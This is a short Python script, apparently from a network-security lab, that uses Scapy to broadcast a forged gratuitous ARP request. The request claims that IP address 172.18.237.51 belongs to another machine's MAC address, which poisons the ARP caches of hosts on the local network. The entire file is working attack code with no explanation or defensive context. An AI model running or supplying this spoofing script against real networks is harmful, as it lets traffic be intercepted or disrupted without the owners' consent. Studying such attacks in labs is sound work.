#!/usr/bin/python3
from scapy.all import *

IP_B = "172.18.237.51"
MAC_M = "08:00:27:73:7e:9d"

arp = ARP(
    op=1,
    psrc=IP_B,
    pdst=IP_B,
    hwsrc=MAC_M,
    hwdst="ff:ff:ff:ff:ff:ff"
)

send(arp)
